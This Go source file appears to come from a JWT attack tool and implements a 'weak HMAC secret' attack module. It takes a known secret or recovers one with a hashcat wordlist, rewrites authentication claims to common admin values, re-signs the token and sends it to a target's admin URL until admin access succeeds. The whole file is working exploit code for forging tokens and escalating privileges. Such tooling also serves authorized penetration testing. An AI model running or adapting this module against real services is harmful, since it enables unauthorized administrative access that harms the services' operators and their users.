package jwt

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/golang-jwt/jwt/v5"

	hmacutil "github.com/spencer5cent/jwtknife/internal/hmac"
	"github.com/spencer5cent/jwtknife/internal/httpx"
	"github.com/spencer5cent/jwtknife/internal/jwtknifejwt"
	"github.com/spencer5cent/jwtknife/internal/report"
)

type weakHMAC struct{}

func NewWeakHMACAttack() Attack { return weakHMAC{} }

func (weakHMAC) Name() string {
	return "Weak HMAC secret (HS*)"
}

func (weakHMAC) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("weak-hmac")

	if !strings.HasPrefix(in.ParsedJWT.Alg, "HS") {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "not an HMAC-signed JWT"
		return ar
	}

	secret := strings.TrimSpace(string(in.HMACSecret))
	if secret == "" && in.AllowResign {
		fmt.Println("This JWT uses", in.ParsedJWT.Alg)
		fmt.Print("If you already know or suspect the HMAC secret, enter it now (or press Enter to skip): ")

		rd := bufio.NewReader(os.Stdin)
		line, _ := rd.ReadString('\n')
		secret = strings.TrimSpace(line)
	}

	if secret == "" {
		if strings.TrimSpace(in.HMACWordlist) != "" {
			recovered, err := hmacutil.RecoverSecret(in.RawJWT, in.ParsedJWT.Alg, strings.TrimSpace(in.HMACWordlist))
			if err == nil {
				secret = recovered
				ar.Notes["recovered_secret"] = recovered
				ar.Note = "HMAC secret recovered with hashcat wordlist"
			} else {
				ar.Errors = append(ar.Errors, err.Error())
			}
		}
	}

	if secret == "" {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "no secret provided (bruteforce not automated)"
		return ar
	}

	method, err := signingMethodForAlg(in.ParsedJWT.Alg)
	if err != nil {
		ar.Outcome = report.OutcomeError
		ar.Errors = append(ar.Errors, err.Error())
		return ar
	}

	candidateClaims := claimsToMutate(in.ParsedJWT)
	for _, claim := range candidateClaims {
		for _, val := range commonAdminValues {
			p, err := jwtknifejwt.Parse(in.RawJWT)
			if err != nil {
				ar.Outcome = report.OutcomeError
				ar.Errors = append(ar.Errors, err.Error())
				return ar
			}

			if p.Payload == nil {
				p.Payload = map[string]any{}
			}
			p.Payload[claim] = val

			token := jwt.NewWithClaims(method, jwt.MapClaims(p.Payload))
			for k, headerVal := range p.Header {
				token.Header[k] = headerVal
			}
			token.Header["alg"] = method.Alg()

			signed, err := token.SignedString([]byte(secret))
			if err != nil {
				ar.Errors = append(ar.Errors, err.Error())
				continue
			}

			r := in.Client.Do(httpx.RequestPlan{
				Label:     "atk-weak-hmac",
				URL:       in.Targets.AdminURL,
				Method:    in.Targets.Method,
				JWT:       signed,
				Placement: in.Targets.Placement,
			})

			step := report.Step{
				Label:   "re-signed-hmac",
				Details: "signed with provided secret, " + claim + "=" + val,
				HTTP:    report.FromHTTPResult(r),
				JWT:     report.JWTInfo{Token: signed},
			}
			ar.Steps = append(ar.Steps, step)

			if report.IsAdminSuccess(in.Baseline, step.HTTP) {
				ar.Outcome = report.OutcomeSuccess
				ar.Note = "admin access achieved with weak HMAC secret"
				return ar
			}

			if report.IsInteresting(in.Baseline, step.HTTP) {
				ar.Outcome = report.OutcomeInteresting
			}
		}
	}

	if ar.Outcome == "" {
		ar.Outcome = report.OutcomeNoEffect
	}
	return ar
}

func signingMethodForAlg(alg string) (jwt.SigningMethod, error) {
	switch strings.ToUpper(strings.TrimSpace(alg)) {
	case "HS256":
		return jwt.SigningMethodHS256, nil
	case "HS384":
		return jwt.SigningMethodHS384, nil
	case "HS512":
		return jwt.SigningMethodHS512, nil
	default:
		return nil, fmt.Errorf("unsupported HMAC algorithm %q", alg)
	}
}

func claimsToMutate(parsed *jwtknifejwt.Parsed) []string {
	var claims []string
	for _, claim := range authClaims {
		if _, ok := parsed.Payload[claim]; ok {
			claims = append(claims, claim)
		}
	}
	if len(claims) == 0 {
		return []string{"sub"}
	}
	return claims
}
